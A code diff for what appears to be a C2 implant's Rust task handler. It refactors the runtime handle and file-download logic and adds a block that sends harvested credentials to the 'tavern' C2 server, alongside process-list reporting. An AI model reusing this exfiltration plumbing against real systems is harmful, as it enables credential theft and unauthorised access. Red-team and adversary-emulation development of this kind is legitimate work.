@@ -1,8 +1,8 @@
 use anyhow::Result;
 use c2::{
     pb::{
-        DownloadFileRequest, DownloadFileResponse, ReportProcessListRequest,
-        ReportTaskOutputRequest, TaskError, TaskOutput,
+        DownloadFileRequest, DownloadFileResponse, ReportCredentialRequest,
+        ReportProcessListRequest, ReportTaskOutputRequest, TaskError, TaskOutput,
     },
     Transport,
 };
@@ -15,18 +15,16 @@ use tokio::task::JoinHandle;
  */
 pub struct TaskHandle {
     id: i64,
-    task: JoinHandle<()>,
-    eldritch: eldritch::Broker,
+    runtime: eldritch::Runtime,
     download_handles: Vec<JoinHandle<()>>,
 }
 
 impl TaskHandle {
     // Track a new task handle.
-    pub fn new(id: i64, eldritch: eldritch::Broker, task: JoinHandle<()>) -> TaskHandle {
+    pub fn new(id: i64, runtime: eldritch::Runtime) -> TaskHandle {
         TaskHandle {
             id,
-            task,
-            eldritch,
+            runtime,
             download_handles: Vec::new(),
         }
     }
@@ -41,16 +39,16 @@ impl TaskHandle {
         }
 
         // Check Task
-        self.task.is_finished()
+        self.runtime.is_finished()
     }
 
     // Report any available task output.
     // Also responsible for downloading any files requested by the eldritch runtime.
     pub async fn report(&mut self, tavern: &mut impl Transport) -> Result<()> {
-        let exec_started_at = self.eldritch.get_exec_started_at();
-        let exec_finished_at = self.eldritch.get_exec_finished_at();
-        let text = self.eldritch.collect_text();
-        let err = self.eldritch.collect_errors().pop().map(|err| TaskError {
+        let exec_started_at = self.runtime.get_exec_started_at();
+        let exec_finished_at = self.runtime.get_exec_finished_at();
+        let text = self.runtime.collect_text();
+        let err = self.runtime.collect_errors().pop().map(|err| TaskError {
             msg: err.to_string(),
         });
 
@@ -94,8 +92,33 @@ impl TaskHandle {
                 .await?;
         }
 
+        // Report Credential
+        let credentials = self.runtime.collect_credentials();
+        for cred in credentials {
+            #[cfg(debug_assertions)]
+            log::info!("reporting credential (task_id={}): {:?}", self.id, cred);
+
+            match tavern
+                .report_credential(ReportCredentialRequest {
+                    task_id: self.id,
+                    credential: Some(cred),
+                })
+                .await
+            {
+                Ok(_) => {}
+                Err(_err) => {
+                    #[cfg(debug_assertions)]
+                    log::error!(
+                        "failed to report credential (task_id={}): {}",
+                        self.id,
+                        _err
+                    );
+                }
+            }
+        }
+
         // Report Process Lists
-        let process_lists = self.eldritch.collect_process_lists();
+        let process_lists = self.runtime.collect_process_lists();
         for list in process_lists {
             #[cfg(debug_assertions)]
             log::info!("reporting process list: len={}", list.list.len());
@@ -120,7 +143,7 @@ impl TaskHandle {
         }
 
         // Download Files
-        let file_reqs = self.eldritch.collect_file_requests();
+        let file_reqs = self.runtime.collect_file_requests();
         for req in file_reqs {
             let name = req.name();
             match self.start_file_download(tavern, req).await {
@@ -147,56 +170,32 @@ impl TaskHandle {
         tavern: &mut impl Transport,
         req: FileRequest,
     ) -> Result<()> {
-        let (ch_file_chunk, file_chunk) = channel::<DownloadFileResponse>();
+        let (tx, rx) = channel::<DownloadFileResponse>();
+
         tavern
-            .download_file(DownloadFileRequest { name: req.name() }, ch_file_chunk)
+            .download_file(DownloadFileRequest { name: req.name() }, tx)
             .await?;
 
-        let task_id = self.id;
-        let handle = tokio::task::spawn(async move {
-            loop {
-                let resp = match file_chunk.recv() {
-                    Ok(r) => r,
-                    Err(_err) => {
-                        match _err.to_string().as_str() {
-                            "receiving on a closed channel" => {}
-                            _ => {
-                                #[cfg(debug_assertions)]
-                                log::error!(
-                                    "failed to download file chunk: task_id={}, name={}: {}",
-                                    task_id,
-                                    req.name(),
-                                    _err
-                                );
-                            }
-                        }
-                        return;
-                    }
-                };
-
-                #[cfg(debug_assertions)]
-                log::info!(
-                    "downloaded file chunk: task_id={}, name={}, size={}",
-                    task_id,
-                    req.name(),
-                    resp.chunk.len()
-                );
-
-                match req.send_chunk(resp.chunk) {
+        let handle = tokio::task::spawn_blocking(move || {
+            for r in rx {
+                match req.send_chunk(r.chunk) {
                     Ok(_) => {}
                     Err(_err) => {
                         #[cfg(debug_assertions)]
                         log::error!(
-                            "failed to send downloaded file chunk: task_id={}, name={}: {}",
-                            task_id,
+                            "failed to send downloaded file chunk: {}: {}",
                             req.name(),
                             _err
                         );
+
                         return;
                     }
-                };
+                }
             }
+            #[cfg(debug_assertions)]
+            log::info!("file download completed: {}", req.name());
         });
+
         self.download_handles.push(handle);
         Ok(())
     }
